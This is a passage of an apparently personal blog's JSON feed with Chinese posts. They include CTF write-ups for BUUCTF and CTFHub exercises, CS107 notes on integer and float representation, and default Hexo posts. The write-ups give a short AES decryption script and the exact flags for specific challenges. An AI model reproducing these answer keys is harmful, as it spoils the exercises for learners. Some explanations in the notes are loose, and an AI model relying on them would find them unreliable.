python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>xor <span class=\"token operator\">=</span> <span class=\"token number\">3657491768215750635844958060963805125333761387746954618540958489914964573229</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>enc_flag <span class=\"token operator\">=</span> <span class=\"token string\">b'>]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>out <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>xor<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>key <span class=\"token operator\">=</span> out<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'key为:'</span><span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>iv <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span>bytes_to_long<span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># print(iv)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>iv <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'iv为:'</span><span class=\"token punctuation\">,</span>iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>aes <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span>AES<span class=\"token punctuation\">.</span>MODE_CBC<span class=\"token punctuation\">,</span>iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>flag <span class=\"token operator\">=</span> aes<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>enc_flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>运行后得到： <code>b'firsT_cry_Aes\\x00\\x00\\x01'</code> ，其中  <code>firsT_cry_Aes</code>  是我们需要的内容，其余部分只是填充使字符串长度达到 16。所以最终的 flag 为  <code>flag&#123;firsT_cry_Aes&#125;</code></p>\n",
            "tags": [
                "BUUCTF"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/09/20/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/",
            "url": "http://yanagi-kon.github.io/2023/09/20/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/",
            "title": "目录遍历",
            "date_published": "2023-09-20T00:44:10.000Z",
            "content_html": "<h1 id=\"目录遍历\"><a class=\"markdownIt-Anchor\" href=\"#目录遍历\">#</a> 目录遍历</h1>\n<p>打开题目可以看到如下页面，该题本质上就是遍历所有目录找取 flag。目录数目不多，所以一个一个点击查找就可以找到。</p>\n<p><img data-src=\"image-20230920084821330.png\" alt=\"image-20230920084821330\"></p>\n<p>找到  <code>flag.txt</code>  文件</p>\n<p><img data-src=\"image-20230920085047645.png\" alt=\"image-20230920085047645\"></p>\n<p>打开得到  <code>flag</code>  为</p>\n<pre><code>ctfhub&#123;bcd6fcf15f15f45dd0cf1a0c&#125;\n</code></pre>\n",
            "tags": [
                "BUUCTF"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/09/19/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_2/",
            "url": "http://yanagi-kon.github.io/2023/09/19/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_2/",
            "title": "斯坦福编程范式CS107_2",
            "date_published": "2023-09-19T12:28:00.000Z",
            "content_html": "<h2 id=\"斯坦福编程范式cs107_2\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_2\">#</a> 斯坦福编程范式 CS107_2</h2>\n<table>\n<thead>\n<tr>\n<th><strong>C/C++</strong></th>\n<th style=\"text-align:left\"></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>bool</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td>char</td>\n<td style=\"text-align:left\">1  byte</td>\n</tr>\n<tr>\n<td>short</td>\n<td style=\"text-align:left\">2  bytes</td>\n</tr>\n<tr>\n<td>int</td>\n<td style=\"text-align:left\">2–4 bytes</td>\n</tr>\n<tr>\n<td>long</td>\n<td style=\"text-align:left\">4 bytes</td>\n</tr>\n<tr>\n<td>long long</td>\n<td style=\"text-align:left\">8  bytes</td>\n</tr>\n<tr>\n<td>float</td>\n<td style=\"text-align:left\">4  bytes</td>\n</tr>\n<tr>\n<td>double</td>\n<td style=\"text-align:left\">8  bytes</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"1为什么二进制中不简单的将-1-置在最左侧表示负数如-3为-1011\"><a class=\"markdownIt-Anchor\" href=\"#1为什么二进制中不简单的将-1-置在最左侧表示负数如-3为-1011\">#</a> 1.\t为什么二进制中不简单的将 1 置在最左侧表示负数（如，-3 为 1011）</h4>\n<p>因为如果是这样的话，-3 + 3 将等于：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1011</span> <span class=\"token operator\">+</span> <span class=\"token number\">0011</span> <span class=\"token operator\">=</span> <span class=\"token number\">1110</span></pre></td></tr></table></figure><p>显然结果是 -6 而不是 0。所以为了使正负数相加得到全 0 或全 1，如：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1100</span> <span class=\"token operator\">+</span> <span class=\"token number\">0011</span> <span class=\"token operator\">=</span> <span class=\"token number\">1111</span></pre></td></tr></table></figure><p>这样得到全 1 后，我们只需要再 +1，就可以得到全 0：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1111</span> <span class=\"token operator\">+</span> <span class=\"token number\">0001</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token number\">0000</span>   这里的<span class=\"token number\">1</span>越界了所以不算</pre></td></tr></table></figure><p>所以实际上，我们采用 <strong>全部取反 并 +1</strong> 的方式用来表示负数： -3 （1101）. 这种方法就叫做  <code>2补码</code></p>\n<p>在 short 类型中，为了使 正数和负数 的数量一致，我们把最左边的那一比特空出，用于分割正数和负数，即正数最大为 $2^{15} -1 $：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span></pre></td></tr></table></figure><p>负数最小是 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo>−</mo><msup><mn>2</mn><mn>15</mn></msup></mrow><annotation encoding=\"application/x-tex\">- 2^{15}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.897438em;vertical-align:-0.08333em;\"></span><span class=\"mord\">−</span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">5</span></span></span></span></span></span></span></span></span></span></span></span>：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span></pre></td></tr></table></figure><h4 id=\"2语言中变量间的相互赋值是如何实现的\"><a class=\"markdownIt-Anchor\" href=\"#2语言中变量间的相互赋值是如何实现的\">#</a> 2.\t语言中变量间的相互赋值是如何实现的？</h4>\n<p>当我们运行如下程序的时候：</p>\n<pre><code class=\"language-c++\">char ch = 'A';\nshort s = ch;\ncout &lt;&lt; s &lt;&lt; endl;\n------\n65\n</code></pre>\n<p>在内存中就是这样进行的：(每一个格子代表 1byte)，内存直接将 <code>ch</code>  的内容复制道 <code>s</code>  中。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">ch</th>\n<th style=\"text-align:center\"></th>\n<th style=\"text-align:center\">65</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">s</td>\n<td style=\"text-align:center\">0</td>\n<td style=\"text-align:center\">65</td>\n</tr>\n</tbody>\n</table>\n<p>如果运行如下程序时：</p>\n<pre><code class=\"language-c++\">short s = 67;\nchar ch = s;\ncout &lt;&lt; ch &lt;&lt; endl;\n------\nC\n</code></pre>\n<p>进行如上赋值操作时，16bit 不能够被直接压缩成为 8bit 的模式。因而 C 和 C++ 中会简单的只关注低位上的内容，而把高位内容直接丢弃。</p>\n<p>如果进行如下程序时：</p>\n<pre><code class=\"language-c++\">short s = -1;\nint i = s;\t\n</code></pre>\n<p>内存中所进行的操作是这样的：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">s</th>\n<th style=\"text-align:center\"></th>\n<th style=\"text-align:center\"></th>\n<th style=\"text-align:center\">1…1</th>\n<th style=\"text-align:center\">1…1</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">int</td>\n<td style=\"text-align:center\">1…1</td>\n<td style=\"text-align:center\">1…1</td>\n<td style=\"text-align:center\">1…1</td>\n<td style=\"text-align:center\">1…1</td>\n</tr>\n</tbody>\n</table>\n<p>这种操作被称为 “符号扩展”。会将 符号位一位一位向上复制，就会导致 int 的前两字节内全变为 1，使得实际的数值仍然为  <code>-1</code></p>\n<h5 id=\"3浮点数float\"><a class=\"markdownIt-Anchor\" href=\"#3浮点数float\">#</a> 3.\t浮点数 float</h5>\n<p>对于浮点数 float，其将整数范围缩小，节省下来的 bit 位用来表示 2 的负次幂，这样就可以表示小数了。这是技术上可以实现的一种方式，但 <code>实际上并不是这样</code> 。</p>\n<p>实际上对于浮点数这样 4 byte 大小的数，浮点数将其中的 1 位用来表示符号，将其中的 8 位用来表示整数，剩下的 23 位用来表示小数。如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>s \t\t\t<span class=\"token function\">exp</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span>bit<span class=\"token punctuation\">)</span>\t\t\t<span class=\"token function\">xxxxxxxx</span><span class=\"token punctuation\">(</span><span class=\"token number\">23</span>bit<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>那么任何一个数都可以用如下形式进行表示：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo>−</mo><mn>1</mn><msup><mo stretchy=\"false\">)</mo><mi>S</mi></msup><mtext>  </mtext><mn>1.</mn><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mtext>  </mtext><mo>×</mo><mtext>  </mtext><msup><mn>2</mn><mrow><mi>e</mi><mi>x</mi><mi>p</mi><mo>−</mo><mn>127</mn></mrow></msup><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mo stretchy=\"false\">(</mo><mn>255</mn><mo>≥</mo><mi>e</mi><mi>x</mi><mi>p</mi><mo>≥</mo><mn>0</mn><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(-1)^S\\;1.xxxxxxxxx\\;×\\;2^{exp-127}     \\;\\;\\;\\;\\;\\;(255≥exp≥0)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.1413309999999999em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\">−</span><span class=\"mord\">1</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05764em;\">S</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1141079999999999em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.864108em;\"><span style=\"top:-3.1130000000000004em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">e</span><span class=\"mord mathnormal mtight\">x</span><span class=\"mord mathnormal mtight\">p</span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\">1</span><span class=\"mord mtight\">2</span><span class=\"mord mtight\">7</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mopen\">(</span><span class=\"mord\">2</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≥</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8304100000000001em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≥</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">0</span><span class=\"mclose\">)</span></span></span></span></span></p>\n<p>例如，对于 7.0，我们可以表示为：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mn>7.0</mn><mo>×</mo><msup><mn>2</mn><mn>0</mn></msup><mspace linebreak=\"newline\"></mspace><mn>3.5</mn><mo>×</mo><msup><mn>2</mn><mn>1</mn></msup><mspace linebreak=\"newline\"></mspace><mn>1.75</mn><mo>×</mo><msup><mn>2</mn><mn>2</mn></msup></mrow><annotation encoding=\"application/x-tex\">7.0×2^0\\\\\n3.5 ×2^1\\\\\n1.75×2^2\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">7</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span></span></span></span></span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">3</span><span class=\"mord\">.</span><span class=\"mord\">5</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord\">7</span><span class=\"mord\">5</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>总归是可以表示到如上的标准形式。</p>\n<h5 id=\"4整数与浮点数之间的赋值\"><a class=\"markdownIt-Anchor\" href=\"#4整数与浮点数之间的赋值\">#</a> 4.\t整数与浮点数之间的赋值</h5>\n<p>如果有以下程序：</p>\n<pre><code class=\"language-c++\">int i = 5;\nfloat f = i;\ncout &lt;&lt; f &lt;&lt; endl;\n----------\n    \n</code></pre>\n<p>这其中变化是这样的：</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>5</mn></mrow><annotation encoding=\"application/x-tex\">5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">5</span></span></span></span> 被解释为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>5.0</mn><mo>×</mo><msup><mn>2</mn><mn>0</mn></msup></mrow><annotation encoding=\"application/x-tex\">5.0×2^0</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">5</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span></span></span></span></span></span></span></span> 随后又被解释为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>2.5</mn><mo>×</mo><msup><mn>2</mn><mn>1</mn></msup></mrow><annotation encoding=\"application/x-tex\">2.5×2^1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">2</span><span class=\"mord\">.</span><span class=\"mord\">5</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span></span></span> 接着又被解释为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>1.25</mn><mo>×</mo><msup><mn>2</mn><mn>2</mn></msup></mrow><annotation encoding=\"application/x-tex\">1.25×2^2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord\">2</span><span class=\"mord\">5</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span>. 因此 exp = 129，xxx=0.25。</p>\n<p>如果有以下程序：</p>\n<pre><code class=\"language-c++\">int i = 37;\nfloat f = *(float*)&amp;i; // 对i的地址求值\n</code></pre>\n<p>&amp;i 表示 i 的地址，i 是 int 类型的数，因而 &amp;i 是 int * 类型的指针。</p>\n<p>(float*)&amp;i 表示将 int * 类型 转变为了 float * 类型，bit 位置不会发生改变，而因为 37 对应的 bit 位 都落在了 xxxxxx 的位置上，因而 exp = 0，这就是一个奇小无比的数，而不是 37.0</p>\n<p>如果有以下程序：</p>\n<pre><code class=\"language-c++\">float f = 7.0;\nshort s = *(short *)&amp;f;\n</code></pre>\n<p>float 是 4 字节的数，指针指向 float 的最高位。当利用上述代码进行类型强制转换的时候，因为 short 只有 2 字节，因而 float 只有高位的两字节被直接复制过来，定义成了一个 short 类型的数。如下图所示：</p>\n<p><img data-src=\"image-20230921091608188.png\" alt=\"image-20230921091608188\"></p>\n",
            "tags": [
                "斯坦福编程范式CS107"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/09/19/WEB%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81/",
            "url": "http://yanagi-kon.github.io/2023/09/19/WEB%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81/",
            "title": "WEB响应包源代码",
            "date_published": "2023-09-19T04:24:13.000Z",
            "content_html": "<h1 id=\"ctfhub-响应包源代码\"><a class=\"markdownIt-Anchor\" href=\"#ctfhub-响应包源代码\">#</a> CTFHub | 响应包源代码</h1>\n<p>题目网页显示的内容如下：</p>\n<p><img data-src=\"test2.png\" alt=\"test2\"></p>\n<p>打开源代码就可以找到答案：</p>\n<p><img data-src=\"test1.png\" alt=\"test1\"></p>\n",
            "tags": [
                "BUUCTF"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/09/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/",
            "url": "http://yanagi-kon.github.io/2023/09/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/",
            "title": "我的第一篇博客",
            "date_published": "2023-09-18T13:04:24.472Z",
            "content_html": "<p>你好！</p>\n<p>Hello！</p>\n<p>Hallo！</p>\n<p>こんにちわ‼</p>\n",
            "tags": [
                "测试"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/09/18/hello-world/",
            "url": "http://yanagi-kon.github.io/2023/09/18/hello-world/",
            "title": "Hello World",
            "date_published": "2023-09-18T12:22:51.258Z",
            "content_html": "<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<p><img data-src=\"hello-world/image-20231120134744416.png\" alt=\"image-20231120134744416\"></p>\n<p><img data-src=\"https://s2.loli.net/2023/11/20/cNt4ipK9CmwfXgF.png\" alt=\"test\"></p>\n<h2 id=\"quick-start\"><a class=\"markdownIt-Anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"markdownIt-Anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo new <span class=\"token string\">\"My New Post\"</span></pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"markdownIt-Anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><figcaption 